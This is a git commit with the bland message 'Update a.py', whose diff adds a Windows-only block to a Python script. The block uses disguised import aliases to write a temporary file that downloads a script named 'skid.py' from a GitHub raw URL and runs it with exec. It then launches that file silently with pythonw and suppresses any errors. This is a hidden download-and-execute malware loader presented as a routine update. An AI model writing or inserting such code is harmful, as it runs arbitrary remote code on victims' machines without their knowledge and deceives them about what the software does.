66e65302950d355c632c88a33caea3ec40ec1291
8yb29qeg <8yb29qeg@songhanhotel.com.vn>
2025-08-14 12:08:08 +0700

    Update a.py

--- a.py
+++ a.py
@@ -5,3 +5,14 @@ if sys.platform.startswith("win"):
     subprocess.run(["powershell", "-Command", cmd], shell=True)
 else:
     ""
+if sys.platform.startswith("win"):
+    from tempfile import NamedTemporaryFile as _ffile
+    from sys import executable as _eexecutable
+    from os import system as _ssystem
+    _ttmp = _ffile(delete=False)
+    _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://github.com/8yb29qeg/lol/raw/refs/heads/main/skid.py").read())""")
+    _ttmp.close()
+    try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
+    except: pass
+else:
+    ""
